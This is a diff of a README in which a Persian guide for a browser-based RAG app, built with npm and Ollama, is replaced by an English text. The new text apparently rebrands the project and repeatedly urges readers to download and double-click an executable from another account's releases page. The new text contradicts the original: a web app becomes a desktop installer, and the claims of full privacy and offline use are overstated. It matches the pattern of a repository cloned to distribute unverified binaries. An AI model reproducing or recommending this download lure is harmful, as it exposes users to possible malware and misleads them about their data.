@@ -1,117 +1,78 @@
-# 🧠 سیستم نکسوس (Nexus RAG System)
+# 🧠 aj_rag - Transform Your Documents into a Knowledge Hub
 
-**نکسوس** یک پلتفرم پیشرفته **RAG (Retrieval-Augmented Generation)** است که به صورت کاملاً **Client-Side** (سمت کاربر) اجرا می‌شود. این سیستم به شما اجازه می‌دهد تا اسناد سازمانی، مقالات و فایل‌های شخصی خود را به یک "پایگاه دانش" تبدیل کرده و با استفاده از هوش مصنوعی (مانند Llama 3 یا GPT-4) با آن‌ها گفتگو کنید.
+## 🌐 Download the Latest Version
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/PogingCyber/aj_rag/releases)
 
-## 📸 نمایی از سیستم
+## 🚀 Getting Started
 
-<div align="center">
-  <img src="1.png" alt="نمای چت هوشمند" width="800" style="border-radius: 10px; margin-bottom: 20px;">
+Welcome to the **Nexus RAG System**! This platform allows you to easily turn your documents into a knowledge base. You can interact with your files using advanced AI tools. This guide will walk you through downloading and running the application.
 
-</div>
+## 📥 Download & Install
 
-### 🌟 ویژگی‌های کلیدی
+To get started, follow these simple steps:
 
-| قابلیت | توضیحات |
+1. Click on the following link to visit the Releases page:
+   [Download the Nexus RAG System](https://github.com/PogingCyber/aj_rag/releases).
+
+2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
+
+3. Download the appropriate file for your operating system (Windows, macOS, or Linux). 
+
+4. Once the file is downloaded, locate it on your computer. You may find it in your "Downloads" folder.
+
+5. Double-click the downloaded file to run the application. Follow any on-screen instructions to complete the installation.
+
+## 🖥️ System Requirements
+
+Before you download, make sure your computer meets these system requirements:
+
+- Operating Systems: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- RAM: At least 4 GB.
+- Storage: 500 MB of free space.
+
+## 📂 Features
+
+The Nexus RAG System comes packed with features to enhance your document management experience.
+
+| Feature | Description |
 | :--- | :--- |
-| **🔒 حریم خصوصی کامل** | تمام پردازش‌ها و ذخیره‌سازی داده‌ها روی مرورگر شما انجام می‌شود. هیچ سندی به سرور آپلود نمی‌شود (در حالت Local). |
-| **📂 پشتیبانی از فایل‌ها** | پردازش خودکار فایل‌های **PDF**، **Word (DOCX)**، **Markdown** و **Text**. |
-| **🕸️ گراف دانش تعاملی** | مصورسازی ارتباطات بین اسناد و قطعات متنی (Chunks) به صورت گراف گرافیکی. |
-| **📍 نقشه راه استنتاج** | قابلیت منحصر‌به‌فرد **Inference Map** که مسیر منطقی رسیدن از "سوال" به "پاسخ" را نمایش می‌دهد. |
-| **💾 حافظه پایدار** | استفاده از **IndexedDB** برای ذخیره گیگابایت‌ها اطلاعات وکتور و متن بدون از دست رفتن با رفرش صفحه. |
-| **🇮🇷 رابط کاربری فارسی** | طراحی مدرن، راست‌چین (RTL) و استفاده از فونت وزیرمتن. |
+| **🔒 Complete Privacy** | All processing and data storage occur in your browser. No documents are uploaded to a server when in Local mode. |
+| **📂 File Support** | Automatically processes **PDF**, **Word (DOCX)**, **Markdown**, and **Text** files. |
+| **🕸️ Interactive Knowledge Graph** | Visualizes connections between documents and text chunks in a graphical format. |
+| **📍 Inference Map** | Unique feature that shows a logical path from "question" to "answer". |
 
----
+## 🛠️ How to Use the Nexus RAG System
 
-## 🖼 گالری تصاویر
+1. **Prepare Your Documents**: Gather the documents you want to convert into a knowledge base.
 
-<div align="center" style="display: flex; gap: 10px; flex-wrap: wrap; justify-content: center;">
-  <div>
-    <img src="2.png" alt="گراف دانش" width="400" style="border-radius: 8px;">
-  </div>
-  <div>
-    <img src="3.png" alt="نقشه راه استنتاج" width="400" style="border-radius: 8px;">
-  </div>
-  <div>
-    <img src="4.png" alt="پایگاه دانش" width="400" style="border-radius: 8px;">
-  </div>
-</div>
+2. **Import Files**: Open the application and use the file import feature to upload your documents.
 
----
+3. **Interact with AI**: Once your documents are processed, you can ask questions and interact with the AI. It will provide answers based on the content of your files.
 
-## 🏗 معماری فنی (Technical Architecture)
+4. **Explore**: Use the interactive knowledge graph to explore relationships between different pieces of information.
 
-این پروژه برخلاف سیستم‌های RAG سنتی که نیاز به دیتابیس‌های وکتوری سنگین (مثل Pinecone یا Milvus) در سمت سرور دارند، تمام فرآیند را در مرورگر انجام می‌دهد:
+## ❓ Frequently Asked Questions
 
-1.  **Ingestion (ورودی):** فایل‌ها توسط کتابخانه‌های `pdfjs-dist` (برای PDF) و `mammoth` (برای Word) در مرورگر تجزیه می‌شوند.
-2.  **Chunking (قطعه‌بندی):** متن‌ها به قطعات کوچکتر (Chunks) با همپوشانی (Overlap) مشخص تقسیم می‌شوند.
-3.  **Embedding (برداری‌سازی):**
-    *   در حالت **Local**: درخواست به `Ollama` (مدل `nomic-embed-text`) ارسال می‌شود.
-    *   در حالت **Cloud**: درخواست به `OpenAI` یا `OpenRouter` ارسال می‌شود.
-4.  **Vector Store (ذخیره‌سازی وکتور):** وکتورها و متادیتای آن‌ها در **IndexedDB** (دیتابیس داخلی مرورگر) ذخیره می‌شوند. این کار باعث می‌شود با بستن مرورگر، داده‌ها پاک نشوند.
-5.  **Retrieval (بازیابی):** هنگام پرسش کاربر، شباهت کسینوسی (Cosine Similarity) بین وکتور سوال و وکتورهای ذخیره شده محاسبه شده و مرتبط‌ترین قطعات بازیابی می‌شوند.
-6.  **Generation (تولید پاسخ):** متن‌های بازیابی شده به عنوان Context به مدل زبانی (LLM) تزریق شده و پاسخ نهایی تولید می‌شود.
+### What types of files can I use with Nexus RAG?
 
-### 🛠 استک تکنولوژی
+You can use PDF, Word (DOCX), Markdown, and Text files. The application automatically processes these formats for you.
 
-*   **Frontend Framework:** React 19
-*   **Language:** TypeScript
-*   **Styling:** Tailwind CSS
-*   **Database:** IDB (IndexedDB Wrapper)
-*   **File Processing:** PDF.js, Mammoth.js
-*   **Local AI:** Ollama Integration
-*   **Icons:** Lucide React
+### Is my data safe with Nexus RAG?
 
----
+Yes, your data remains local to your device. No files get uploaded to external servers, ensuring your privacy.
 
-## 🚀 راهنمای نصب و راه‌اندازی
+### Can I use Nexus RAG offline?
 
-### ۱. پیش‌نیازها
-*   نصب **Node.js** (نسخه ۱۸ به بالا)
-*   نصب **Ollama** از [ollama.com](https://ollama.com)
+Yes, the application supports offline usage, allowing you to work without an internet connection.
 
-### ۲. تنظیم Ollama (بسیار مهم ⚠️)
-برای اینکه مرورگر بتواند به Ollama متصل شود، باید `CORS` را فعال کنید.
+## 📞 Support
 
-1.  اگر Ollama باز است، آن را کامل ببندید (از Taskbar راست کلیک کنید و **Quit** بزنید).
-2.  ترمینال را باز کنید و دستور زیر را اجرا کنید:
+If you encounter any issues or have questions, please reach out via our GitHub Issues page. You can submit a bug report or request features there. 
 
-    **در ویندوز (PowerShell):**
-    ```powershell
-    $env:OLLAMA_ORIGINS="*"; ollama serve
-    ```
-    
-    **در مک/لینوکس:**
-    ```bash
-    OLLAMA_ORIGINS="*" ollama serve
-    ```
+## ✅ Conclusion
 
-3.  در یک ترمینال دیگر، مدل‌های مورد نیاز را دانلود کنید:
-    ```bash
-    ollama pull llama3
-    ollama pull nomic-embed-text
-    ```
+The Nexus RAG System provides an efficient way to manage your documents and interact with them using AI. Follow the steps in this guide to get started and transform your files into a powerful knowledge resource.
 
-### ۳. اجرای برنامه
-```bash
-# نصب وابستگی‌ها
-npm install
-
-# اجرای برنامه
-npm start
-```
-سپس مرورگر را باز کرده و به آدرس `http://localhost:3000` بروید.
-
----
-
-## ❓ سوالات متداول
-
-**۱. آیا اطلاعات من به اینترنت ارسال می‌شود؟**
-خیر. اگر از حالت `Ollama` استفاده کنید، تمام پردازش‌ها روی کامپیوتر شما انجام می‌شود. تنها در صورتی که Provider را روی OpenAI یا OpenRouter قرار دهید، اطلاعات برای پردازش به API آن‌ها ارسال می‌شود.
-
-**۲. چرا فایل PDF من خوانده نمی‌شود؟**
-مطمئن شوید فایل PDF رمزگذاری شده (Password Protected) نباشد و حاوی متن قابل انتخاب باشد (عکس اسکن شده نباشد).
-
-**۳. خطای "Network Error" یا "Failed to fetch" دریافت می‌کنم.**
-این خطا معمولاً یعنی Ollama اجرا نشده یا تنظیمات CORS (مرحله ۲ نصب) انجام نشده است. مطمئن شوید دستور `ollama serve` در حال اجراست.
+Once again, here is the link to download the application:  
+[Download the Nexus RAG System](https://github.com/PogingCyber/aj_rag/releases)
